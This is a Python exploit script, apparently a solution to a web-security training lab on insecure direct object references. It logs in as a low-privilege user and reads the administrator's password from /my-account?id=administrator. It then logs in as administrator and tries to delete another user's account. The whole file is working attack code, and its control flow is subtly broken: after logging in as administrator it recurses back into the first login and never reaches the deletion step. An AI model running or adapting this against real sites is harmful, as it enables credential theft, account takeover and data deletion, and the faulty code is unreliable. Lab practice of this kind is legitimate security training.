# Lab: user ID controlled by request parameter with password disclosure
import sys
import urllib3
import requests
from bs4 import BeautifulSoup
import os
from dotenv import load_dotenv

load_dotenv()

urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

proxies = {
    'http': "http://" + os.getenv("PROXY_IP") + ":" + os.getenv("PROXY_PORT"),
    'https': "https://" + os.getenv("PROXY_IP") + ":" + os.getenv("PROXY_PORT")
}


def get_csrf_token(s, url):
    r = s.get(url, verify=False, proxies=proxies)
    soup = BeautifulSoup(r.text, 'html.parser')
    csrf_token = soup.find("input", {"name": "csrf"})["value"]
    return csrf_token


def login_admin(s, url, password, admin_name, csrf):
    login_url = url + "/login"
    data = {"csrf": csrf, "username": admin_name, "password": password}
    r = s.post(login_url, verify=False, data=data, proxies=proxies)
    res = r.text

    if "Update password" in res:
        print("(-> Logged in as Administrator")
        # delete user acc
        log_in_and_delete_user(s, url)

    else:
        print("(-) Couldn't login as administrator")
        exit(-1)


def delete_user(s, url):
    delete_url = url + "/delete?username=carlos"

    r = s.post(delete_url, verify=False)

    if "200" in r.text:
        print("(-> Attack executed with success, user deleted...")
    else:
        print("(-) Couldn't delete user")
        exit(-1)


def get_admin_passw(s, url):
    admin_url = url + "/my-account?id=administrator"
    r = s.get(admin_url, verify=False, proxies=proxies)
    resp = r.text

    if "Your username is: administrator" in resp:
        print("(-> In admin page...")
        # get password from update password field
        soup = BeautifulSoup(resp, "html.parser")
        password = soup.find("input", type="password")["value"]
        return password
    else:
        print("(-) Couldn't get administrator login page")
        exit(-1)


def log_in_and_delete_user(s, url):
    # first login and execute horizontal privilege escalation
    # get csrf token
    login_url = url + "/login"
    csrf_token = get_csrf_token(s, login_url)
    data = {"csrf": csrf_token, "username": "wiener", "password": "peter"}
    # login as wiegner user
    r = s.post(login_url, verify=False, data=data, proxies=proxies)
    res = r.text

    if "Update password" in res:
        print("(-> Logged in...")
        password = get_admin_passw(s, url)
        login_admin(s, url, password, "administrator", csrf_token)

    else:
        print("(-) Couldn't get user account page")
        exit(-1)


def main():
    if len(sys.argv) != 2:
        print("(-> Usage: %s <url>" % sys.argv[0])
        print("(-> Example: %s www.example.com" % sys.argv[0])
        sys.exit(-1)

    url = sys.argv[1]
    s = requests.Session()
    print("(-> Horizontal to vertical privilege escalation vulnerability...")
    log_in_and_delete_user(s, url)


if __name__ == "__main__":
    main()
